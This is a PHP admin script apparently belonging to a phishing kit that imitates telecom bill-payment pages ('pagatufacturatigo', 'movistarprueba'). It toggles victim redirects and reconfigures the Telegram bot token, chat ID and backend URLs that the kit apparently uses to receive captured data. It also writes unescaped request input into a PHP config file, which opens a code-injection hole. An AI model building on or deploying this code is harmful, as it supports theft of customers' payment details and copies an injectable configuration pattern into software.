<?php
// god/settings.php
header('Content-Type: application/json');
require_once __DIR__ . '/auth.php'; // Ensure user is logged in
$configFile = __DIR__ . '/../pagos/redirect_status.json';

// Helper to read config
function readConfig($file)
{
    if (!file_exists($file))
        return ['enabled' => true];
    $content = file_get_contents($file);
    if (!$content)
        return ['enabled' => true];
    $json = json_decode($content, true);
    if (!is_array($json))
        return ['enabled' => true];
    return $json;
}

// Helper to write config
function writeConfig($file, $data)
{
    // Write safely
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

$action = $_GET['action'] ?? '';

if ($action === 'get_redirect') {
    $config = readConfig($configFile);
    echo json_encode(['status' => 'success', 'enabled' => $config['enabled']]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'set_redirect') {
    $input = json_decode(file_get_contents('php://input'), true);
    if (isset($input['enabled'])) {
        $config = ['enabled' => (bool) $input['enabled']];
        writeConfig($configFile, $config);
        echo json_encode(['status' => 'success', 'enabled' => $config['enabled']]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Missing enabled param']);
    }
    exit;
}

if ($action === 'get_telegram') {
    $mainConfig = __DIR__ . '/../pagos/config.php';
    if (!file_exists($mainConfig)) {
        echo json_encode(['status' => 'error', 'message' => 'Config no encontrada']);
        exit;
    }
    $cfg = require $mainConfig;
    echo json_encode([
        'status' => 'success', 
        'botToken' => $cfg['botToken'] ?? '', 
        'chatId' => $cfg['chatId'] ?? '',
        'renderUrl' => $cfg['renderUrl'] ?? '',
        'backendUrl' => str_replace('/pagos/updatetele.php', '', $cfg['baseUrl'] ?? 'https://pagatufacturatigo.vercel.app')
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'set_telegram') {
    $input = json_decode(file_get_contents('php://input'), true);
    if (!isset($input['botToken']) || !isset($input['chatId'])) {
        echo json_encode(['status' => 'error', 'message' => 'Faltan parámetros']);
        exit;
    }
    
    $mainConfig = __DIR__ . '/../pagos/config.php';
    if (file_exists($mainConfig)) {
        $content = file_get_contents($mainConfig);
        
        // Cargar config antigua para saber qué buscar y reemplazar
        $oldCfg = require $mainConfig;
        $oldRenderUrl = $oldCfg['renderUrl'] ?? 'https://movistarprueba.onrender.com';
        
        $newToken = $input['botToken'];
        $newChat = $input['chatId'];
        $newRenderUrl = $input['renderUrl'] ?? $oldRenderUrl;
        $newBackendUrl = rtrim($input['backendUrl'] ?? '', '/');

        // Expresión regular para reemplazar config
        $content = preg_replace("/('botToken'\s*=>\s*getenv\('BOT_TOKEN'\)\s*\?:\s*')[^']+'/", "\$1$newToken'", $content);
        $content = preg_replace("/('chatId'\s*=>\s*getenv\('CHAT_ID'\)\s*\?:\s*')[^']+'/", "\$1$newChat'", $content);
        $content = preg_replace("/('renderUrl'\s*=>\s*')[^']+'/", "\$1$newRenderUrl'", $content);
        
        if (!empty($newBackendUrl)) {
            // Reemplazar el dominio manteniendo la ruta /pagos/updatetele.php
            $content = preg_replace("/('baseUrl'\s*=>\s*getenv\('BASE_URL'\)\s*\?:\s*')[^']+(\/pagos\/updatetele\.php')/", "\$1$newBackendUrl\$2", $content);
        }
        
        file_put_contents($mainConfig, $content);
        
        // Si el renderUrl cambia, hay que reescribir app.py y index.html
        if ($oldRenderUrl !== $newRenderUrl && !empty($newRenderUrl)) {
            $appFile = __DIR__ . '/../app.py';
            if (file_exists($appFile)) {
                $appContent = file_get_contents($appFile);
                $appContent = str_replace($oldRenderUrl, $newRenderUrl, $appContent);
                file_put_contents($appFile, $appContent);
            }
            
            $indexFile = __DIR__ . '/../index.html';
            if (file_exists($indexFile)) {
                $indexContent = file_get_contents($indexFile);
                $indexContent = str_replace($oldRenderUrl, $newRenderUrl, $indexContent);
                file_put_contents($indexFile, $indexContent);
            }
        }
        
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Config no encontrada']);
    }
    exit;
}

echo json_encode(['status' => 'error', 'message' => 'Invalid action']);
